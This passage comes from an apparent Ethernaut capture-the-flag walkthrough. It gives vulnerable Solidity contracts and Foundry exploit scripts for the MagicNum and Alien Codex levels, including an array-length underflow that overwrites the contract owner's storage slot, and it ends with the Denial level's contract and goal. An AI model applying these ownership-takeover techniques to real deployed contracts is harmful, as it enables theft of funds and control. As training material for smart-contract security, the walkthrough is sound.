</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>MagicNum</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">from</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level18.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level18Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    MagicNum </span><span class="token" style="color:#569CD6">public</span><span> magicNum </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">MagicNum</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xD5cf766bc937340767d9cf5Fd89eF1C14b78BF9B</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    MagicNum </span><span class="token" style="color:#569CD6">public</span><span> magicNum </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">MagicNum</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xD5cf766bc937340767d9cf5Fd89eF1C14b78BF9B</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> bytecode </span><span class="token" style="color:#d4d4d4">=</span><span> hex</span><span class="token" style="color:#ce9178">&quot;69602a60005260206000f3600052600a6016f3&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> _solver</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>          </span><span class="token" style="color:#6a9955">// create(value, offset, size)</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">assembly</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            _solver</span><span class="token" style="color:#d4d4d4">:=</span><span> </span><span class="token" style="color:#dcdcaa">create</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#dcdcaa">add</span><span class="token" style="color:#d4d4d4">(</span><span>bytecode</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#b5cea8">0x20</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#b5cea8">0x13</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>_solver </span><span class="token" style="color:#d4d4d4">!=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        magicNum</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">setSolver</span><span class="token" style="color:#d4d4d4">(</span><span>_solver</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level18Solution.s.sol:Level18Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Alien Codex</h2>
<p><strong>Level19.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.5.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&#x27;./helpers/Ownable-05.sol&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">AlienCodex</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Ownable </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">bool</span><span> </span><span class="token" style="color:#569CD6">public</span><span> contact</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">bytes32</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#569CD6">public</span><span> codex</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">contacted</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">assert</span><span class="token" style="color:#d4d4d4">(</span><span>contact</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">makeContact</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    contact </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">record</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes32</span><span> _content</span><span class="token" style="color:#d4d4d4">)</span><span> contacted </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    codex</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">push</span><span class="token" style="color:#d4d4d4">(</span><span>_content</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">retract</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> contacted </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    codex</span><span class="token" style="color:#d4d4d4">.</span><span>length</span><span class="token" style="color:#d4d4d4">--</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">revise</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> i</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes32</span><span> _content</span><span class="token" style="color:#d4d4d4">)</span><span> contacted </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    codex</span><span class="token" style="color:#d4d4d4">[</span><span>i</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> _content</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Claim ownership to complete the level.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>When we see the solidity version, it is 0.5.0 and it is prone to integer overflow/underflow.</li>
<li>To call any function on the contract we need to call the <code>makeContact()</code> function initially.</li>
<li>AlineCodex inherits the Ownable contract which has the state variable <code>owner</code>. It will be stored at slot 0 combined with <code>contact</code> boolean variable.</li>
<li>Here, in the slot 1 the legth of the <code>codex</code> array will be stored and it will be updated whenever a new element is pushed onto the array.</li>
<li><code>AleinCodex</code> also changes the length of the <code>codex</code> with <code>retract()</code> function.</li>
<li><code>revise()</code> function allows us to modify any existing element of the <code>codex</code> array. Keep in mind that each element will stored at different storage slot.</li>
<li>Initially the length of the <code>codex</code> is 0. If we call the <code>retract()</code> it will be <code>0 - 1</code> which results in underflow and stores the value  <strong><code>2^256 - 1</code></strong> as the length.</li>
<li>So, now the codex array has access to all the storage slots of the contract. We can use this to update the <code>owner</code> value which is stored at the slot 0.</li>
<li>The codex array elements starts from the slot (keccak256(1)).</li>
<li>We need to pass the index
<code>2^256 - 1 - unit(keccack256(1)) + 1</code> to the <code>revise()</code> function for accessing the slot 0.</li>
<li>Pass our address in the <code>revise()</code> function along with the index. Then we will become the owner.</li>
</ol>
<pre><code>
| Slot Number          | Variables                                                                                          |
|----------------------|----------------------------------------------------------------------------------------------------|
| 0                    | - bool public contact&lt;br&gt;- address private _owner&lt;br&gt;- codex[2^256 - 1 - uint(keccak256(1))] + 1 (Access to slot 0)  |
| 1                    | - codex.length (Number of elements in the dynamic array)                                            |
| keccak256(1)         | - codex[0] (Array&#x27;s first element)                                                                 |
| keccak256(1) + 1     | - codex[1] (Array&#x27;s second element)                                                                |
| ...                  | ...                                                                                                |
| ...                  | ...                                                                                                |
| ...                  | ...                                                                                                |
| 2^256 - 1            | - codex[2^256 - 1 - uint(keccak256(1))] (Array&#x27;s last element)                                      |
| 0                    | - codex[2^256 - 1 - uint(keccak256(1))] + 1 (got access to slot 0)                                  |

</code></pre>
<p><strong>Level19Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">IAlienCodex</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">makeContact</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">record</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes32</span><span> _content</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">retract</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">revise</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> i</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes32</span><span> _content</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level19Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    IAlienCodex </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">IAlienCodex</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xe5EC55D210Edd23dBB7d055E9ed63DAA8E35e493</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<!-- -->
<!-- -->
<span>    </span><span class="token" style="color:#ce9178">uint</span><span> index </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">2</span><span> </span><span class="token" style="color:#d4d4d4">**</span><span> </span><span class="token" style="color:#b5cea8">256</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encode</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">+</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">bytes32</span><span> myAddress </span><span class="token" style="color:#d4d4d4">=</span><span>  </span><span class="token" style="color:#ce9178">bytes32</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint160</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;MY_ADDRESS&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">makeContact</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">retract</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">revise</span><span class="token" style="color:#d4d4d4">(</span><span>index</span><span class="token" style="color:#d4d4d4">,</span><span>myAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#ce9178">bytes32</span><span> newOwner </span><span class="token" style="color:#d4d4d4">=</span><span> vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">load</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#ce9178">bytes32</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">logBytes32</span><span class="token" style="color:#d4d4d4">(</span><span>newOwner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level19Solution.s.sol:Level19Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Denial</h2>
<p><strong>Level20.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Denial</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> partner</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// withdrawal partner - pay the gas, split the withdraw</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">constant</span><span> owner </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xA9E</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint</span><span> timeLastWithdrawn</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> </span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span> withdrawPartnerBalances</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// keep track of partners balances</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setWithdrawPartner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _partner</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        partner </span><span class="token" style="color:#d4d4d4">=</span><span> _partner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// withdraw 1% to recipient and 1% to owner</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">withdraw</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">uint</span><span> amountToSend </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance </span><span class="token" style="color:#d4d4d4">/</span><span> </span><span class="token" style="color:#b5cea8">100</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// perform a call without checking return</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// The recipient can revert, the owner will still get their share</span><span>
</span><span>        partner</span><span class="token" style="color:#d4d4d4">.</span><span>call</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span>amountToSend</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span>owner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>amountToSend</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// keep track of last withdrawal time</span><span>
</span><span>        timeLastWithdrawn </span><span class="token" style="color:#d4d4d4">=</span><span> block</span><span class="token" style="color:#d4d4d4">.</span><span>timestamp</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        withdrawPartnerBalances</span><span class="token" style="color:#d4d4d4">[</span><span>partner</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+=</span><span>  amountToSend</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// allow deposit of funds</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">receive</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// convenience function</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">contractBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</p>
